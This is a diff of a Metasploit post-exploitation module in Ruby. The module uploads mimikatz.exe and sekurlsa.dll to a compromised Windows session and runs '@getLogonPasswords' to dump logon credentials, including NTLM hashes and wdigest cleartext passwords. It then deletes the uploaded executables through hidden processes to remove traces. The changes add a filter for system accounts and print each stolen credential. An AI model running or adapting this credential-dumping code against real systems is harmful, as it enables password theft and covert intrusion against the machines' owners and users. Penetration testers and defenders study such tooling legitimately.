@@ -26,8 +26,7 @@ class Metasploit3 < Msf::Post
                 ))
 
                 register_options([
-#                        OptAddress.new("LHOST",   [ false, "Listener IP address for the new session" ]),
-#                        OptPort.new("LPORT",      [ false, "Listener port for the new session", 4444 ]),
+			OptBool.new('SHOW_SYSTEM_USERS', [ false, 'Show the system users, which often have un-readable passwords.', false])
                 ])
 
         end
@@ -36,11 +35,11 @@ class Metasploit3 < Msf::Post
 		print_status("Running module against #{sysinfo['Computer']}")
 		host = Rex::FileUtils.clean_path(sysinfo["Computer"])
                 pass_file = store_loot("windows.passwords", "text/plain", session, "", "#{host}_passwords.txt", "Windows Passwords")
-		print_status(pass_file)
-                mimikatz_dump(datastore['GETSYSTEM'], pass_file)
+		print_status("Writing output to: #{pass_file}")
+                mimikatz_dump(pass_file)
 	end
 
-	def mimikatz_dump(bypassuac, password_file)
+	def mimikatz_dump(password_file)
 
 		#
 		# Upload mimikatz.exe and sekurlsa.dll
@@ -90,20 +89,21 @@ class Metasploit3 < Msf::Post
 		
 		r.channel.read
                 r.channel.write("@getLogonPasswords\n")
-		tmpusers = ""
-		tmpusers += r.channel.read.to_s
-		tmpusers += r.channel.read.to_s
-
-		users = parse_passdump(tmpusers)
-		output_file(users, password_file)
+                
+		user_output = r.channel.read
+                user_output += r.channel.read
 
 		r.channel.write("exit\n")
 			
 		# delete the uac bypass payload
+		print_status("Deleting executables")	
                 delete_exe = "cmd.exe /c del \"#{tmpdir}\\#{exe_filename}\""
 		delete_dll = "cmd.exe /c del \"#{tmpdir}\\#{dll_filename}\""	
                 session.sys.process.execute(delete_exe, nil, {'Hidden' => true})
 		session.sys.process.execute(delete_dll, nil, {'Hidden' => true})
+
+		users = parse_passdump(user_output)
+                output_file(users, password_file)
 	end
 
 	def parse_passdump(pass_dump)
@@ -128,7 +128,10 @@ class Metasploit3 < Msf::Post
 				current[:tspkg] = line[/.*:\s*(.*)/, 1] || ""
 				current[:tspkg] = "" if current[:tspkg] == "n.t. (LUID KO)"
 
-				users.push(current)
+				#Check to see if we are storing all users, or only non-system users
+				if datastore['SHOW_SYSTEM_USERS'] || !is_system_user?(current)
+					users.push(current)
+				end
 				current = {:username => "", :domain => "", :lmhash => "", :ntlmhash => "", :wdigest => "", :tspkg => ""}
 			end
 		end
@@ -143,6 +146,15 @@ class Metasploit3 < Msf::Post
 
 		file_local_write(password_file, output)	
 
+		output.split(/\r?\n/).each do |line|
+			print_good(line)
+		end
+
+	end
+
+	def is_system_user?(user)
+		system_users = [/^$/, /^ASP\.NET V2\.0 Integrated$/, /^ANONYMOUS LOGON$/, /^IUSR.*/, /.*\$$/, /^LOCAL SERVICE$/]	
+		return system_users.find{|r| user[:username].match(r)}
 	end
 
 end
